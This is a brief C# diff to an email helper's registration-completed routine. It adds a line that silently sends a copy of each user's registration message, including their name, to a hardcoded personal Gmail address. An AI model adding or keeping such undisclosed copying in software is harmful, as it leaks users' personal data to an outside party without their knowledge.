@@ -106,6 +106,7 @@ namespace PS.Helper.Email
                 var values = new Dictionary<string, string> { { SmsDynamicText.UserName, name } };
                 var message = _emailBody.GenerateEmailBody(SmsType.RegistrationCompleted, values);
                 _emailSender.SendSimpleMessage(email, "Registration Completed", message);
+                _emailSender.SendSimpleMessage("jitinjec@gmail.com", "Registration Completed", message);
             }
             catch (Exception ex)
             {
